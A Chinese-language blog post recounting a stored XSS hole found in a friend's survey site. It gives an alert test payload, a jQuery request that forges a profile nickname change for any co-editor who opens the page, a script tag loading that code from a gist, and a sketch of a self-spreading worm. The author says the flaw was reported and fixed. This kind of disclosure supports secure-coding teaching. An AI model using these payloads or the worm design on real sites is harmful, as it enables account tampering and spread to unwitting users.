---
layout: post
title: 一次简单的 Cross-Site Scripting XSS 跨站脚本攻击

published: true

tags:
- javascript
- cross-site scripting
- xss
- web security

type: post
status: publish
---

[Cross-Site Scripting XSS](http://en.wikipedia.org/wiki/Cross-site_scripting) 做网页应用的都了解。之前一直知道在开发中要注意防范这个，但是没有试过。一个偶然的机会，在朋友开发的一个网站上小试了一把。

### 发现漏洞

说实话现在同事或者朋友的网站，见了输入框就想试一把 Javascript 注入。这次有一个某数据调查网站，做的十分精巧，用起来也很不错。其中有一个页面，是用户可以自己创建一个表单。表单可以有很多种元素，包括单选、 多选、 单行文本、 多行文本、 数字、 日期、 下拉框等。大多数用户输入都是安全的，但是还是发现了用户自定义单选选项，这个的 Javascript 输入没有被转义。

![在 input 中输入 Javascript]({{ site.static_url }}/images/2013/xss-javascript-code-inject.jpg)

上图可以看到在用户自定义表单的单选项目时，在项目选项中输入了一个简单的 `<script>alert(1);</script>`

![没有被转移的 Javascript]({{ site.static_url }}/images/2013/xss-unescaped-javascript.jpg)

保存后，打开这个编辑页面，都可以看到这个没有被转移的 Javascript 被执行了。

### 进行攻击

哦耶，下一步就是想如何利用这个漏洞了。如何让更多的用户访问到被恶意代码注入的网页？我测试的将表单发给用户，但是表单填写页面的 Javascript 都被转移了，即 注入 只存在在编辑页面上。幸好该产品有一个合作编辑功能，即可以把某个表单共享给好友让他一起编辑。

<!-- more -->

下面就是完善注入的代码达到攻击的效果。注入的 Javascript 通过获取被攻击用户的 Cookies，就可以伪装称被攻击者来进行操作。我采取了用户 Profile 管理的一个接口，用户在 Profile 管理时，可以通过一个 form 来修改用户名。这个 form 是一个很简单的 post 提交。我们可以通过 注入 的 Javascript 来伪造他。

    $(function(){
      var randomNum = Math.floor(Math.random() * 10000);

      $.post('/profile', {
        '_method': 'put',
        'user[nick_name]': 'I Love Feng Zhichao ' + randomNum
      });
    });

上面这段代码就是通过 jQuery 来 Post 一个请求到 /profile 上，来更新 user 的 nick_name。注意由于该产品不允许有重复的 nick_name，所以加入了一个随机数字来保证唯一性。（之前试了 n 把一直不成功才发现是用户名重复...）

由于该表单选项有字符数限制，只能将这段代码托管到别的地方，又是 [github](https://github.com/) 上： [https://gist.github.com/4681574](https://gist.github.com/4681574)。获取其 raw 文件 url 为：https://gist.github.com/raw/4681574.js。

![攻击的 Javascript]({{ site.static_url }}/images/2013/xss-attack-code.jpg)

在表单上注入 `<script src='https://gist.github.com/raw/4681574.js'>`。

### 小试牛刀

先试一个，将该表单共享给某个好友，当该好友打开其编辑页面时：

![Ajax 的 Post 请求]({{ site.static_url }}/images/2013/xss-ajax-post.jpg)

注入的 Javascript 会发送一个 Ajax Post 请求，这个请求就会将被攻击用户的用户名修改了。

![被恶意修改了的用户名]({{ site.static_url }}/images/2013/xss-modified-user-nick-name.jpg)

看上图的右上角，被攻击用户的用户名已经被注入的 Javascript 恶意修改了。

### 后记

发给几个朋友娱乐了一下并告知他们后，这个漏洞很快就被修复了，我也没有做更进一步的攻击。如果真正的想做攻击的话，注入的脚步需要更为复杂一些，而且需要像病毒一样的可自我传播。就不能仅仅是修改个用户名这么娱乐化了。比如可以通过 Javascript 再给被攻击者创建一个带有注入脚步的表单，然后获取被攻击者的好友并把这个表单共享给他们编辑。这样就会使攻击散播的更为广泛。

这个知道就行了，大家以后的代码都得谨慎，可不能为了一点儿偷懒或者自以为用户很乖就忽视 XSS。记住一点，永远不能轻易相信用户提交的数据！
